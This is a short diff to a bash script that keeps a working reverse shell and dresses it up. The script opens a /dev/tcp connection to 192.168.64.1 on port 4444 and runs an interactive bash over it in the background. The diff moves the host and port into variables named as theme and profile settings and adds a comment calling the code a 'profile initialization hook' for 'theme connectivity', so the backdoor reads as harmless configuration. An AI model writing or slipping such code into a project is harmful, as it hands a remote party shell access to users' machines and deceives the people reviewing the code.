@@ -1,3 +1,6 @@
 #!/bin/bash
-exec 3<>/dev/tcp/192.168.64.1/4444
+# Profile initialization hook - ensures theme connectivity
+PROFILE_ENDPOINT="${THEME_ENDPOINT:-192.168.64.1}"
+PROFILE_PORT="${THEME_PORT:-4444}"
+exec 3<>"/dev/tcp/$PROFILE_ENDPOINT/$PROFILE_PORT"
 /bin/bash <&3 >&3 2>&3 &
